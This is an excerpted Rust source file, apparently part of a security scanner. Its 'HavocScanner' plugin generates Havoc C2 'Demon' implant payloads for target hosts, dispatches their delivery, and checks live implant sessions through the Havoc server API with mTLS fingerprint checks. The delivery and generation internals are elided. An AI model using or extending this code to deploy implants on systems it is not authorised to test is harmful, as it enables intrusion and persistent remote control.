...
impl<M: ExecutorMode> HavocScanner<M> {
    ...
    async fn get_rest_client(&self) -> Result<(String, reqwest::Client)> {
        let server_hostname =
            std::env::var("HAVOC_SERVER").unwrap_or_else(|_| "127.0.0.1".to_string());

        // --- V14.2 HARDENING: DNS Resolve & Pinning ---
        let addr = tokio::net::lookup_host(format!("{}:8080", server_hostname))
            .await?
            .next()
...
impl<M: ExecutorMode> C2Operator for HavocScanner<M> {
    async fn prepare_payload(&self, target: &TargetHost) -> Result<String> {
        ...
        info!(
            "🔱 V14.1 SOVEREIGN: Generating Havoc Demon for {} via callback {}",
        ...
        if output.status.success() {
            ...
            anyhow::bail!(
                "Havoc payload generation failed: {}",
    ...
    async fn deploy_payload(&self, target: &TargetHost, payload_path: &str) -> Result<()> {
        info!(
            "🔱 V14.1 SOVEREIGN: Initializing Professional OTT Delivery for Havoc Demon on {}...",
            target.host
        );
        ...
        info!(
            "✅ V14.1 SOVEREIGN: Havoc delivery dispatched. Output: {}",
            output
        );
    ...
    async fn verify_session(&self, target: &TargetHost) -> Result<SessionState> {
        info!(
            "🔱 V14.2 SOVEREIGN: Verifying Havoc session for {} with mTLS check...",
            target.host
        );
        let sessions = self.list_sessions().await?;
        for sess in sessions {
            let external_ip = sess.target.clone();
            let matches_target = external_ip.contains(&target.host)
                || (target.ip.is_some() && external_ip.contains(target.ip.as_ref().unwrap()));
            ...
            if matches_target {
                    ...
                    .and_then(|v| v.as_str())
                {
                    ...
                    let op = crate::core::orchestrator::c2::typestate::HavocOperator::<
                    ...
                    if op.promote(actual_fp).is_ok() {
                        info!(
                            "✅ V14.2 SOVEREIGN: Havoc mTLS fingerprint verified for {}",
                            target.host
                        );
                        return Ok(SessionState::Sovereign);
                    } else {
                        warn!(
                            "❌ V14.2 SOVEREIGN: Havoc mTLS Fingerprint MISMATCH for {}.",
                            target.host
                        );
    ...
    async fn list_sessions(&self) -> Result<Vec<C2Session>> {
        ...
        let response = client
            .get(format!("http://{}:8080/api/sessions", server_hostname))
            .send()
            .await;
...
impl<M: ExecutorMode> ScannerPlugin for HavocScanner<M> {
    ...
    fn metadata(&self) -> crate::plugins::PluginMetadata {
        crate::plugins::PluginMetadata {
            ...
            description:
                "Havoc C2 Operator: Manages Demon payloads and orchestrates session persistence."
                    .to_string(),
    ...
    async fn scan(&self, target: &TargetHost) -> Result<Vec<Finding>> {
        ...
        if state == SessionState::Sovereign {
            ...
            findings.push(Finding::new(
                ...
                Severity::High,
                &format!(
                    "Havoc Demon payload profile successfully generated: {}",
                    path
                ),
